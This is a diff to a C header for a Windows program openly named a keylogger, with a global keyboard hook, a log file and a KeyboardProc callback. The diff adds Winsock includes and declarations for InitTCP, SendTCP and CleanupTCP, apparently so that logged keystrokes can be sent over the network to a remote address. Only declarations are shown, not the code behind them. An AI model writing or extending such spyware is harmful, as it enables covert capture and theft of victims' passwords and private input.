@@ -17,6 +17,14 @@
 #define NTDDI_VERSION NTDDI_WIN10
 #endif
 
+#define Vk_SHIFT 160
+#define Vk_ALT   164
+
+#pragma warning(push)
+#pragma warning(pop)
+#pragma warning(disable: 4820)  // Padding warnings
+#pragma warning(disable: 4242)  // Conversion warnings
+#pragma comment(lib, "ws2_32.lib")
 
 #include <stdio.h>
 #include <windows.h>
@@ -26,6 +34,9 @@
 #include <stdbool.h>
 #include <string.h>
 #include <stdlib.h>
+#include <winsock2.h>
+#include <ws2tcpip.h>
+#include <process.h>
 
 extern HHOOK g_Hook;
 extern FILE *LogFile;
@@ -40,5 +51,11 @@ bool    Keylogger(void);
 
 /*Callback*/
 LRESULT CALLBACK    KeyboardProc(int code, WPARAM wParam, LPARAM lParam);
+
+
+/* TCP */
+bool    InitTCP(const char *ip, int port);
+void    SendTCP(const char* data);
+void    CleanupTCP(void);
 
 #endif
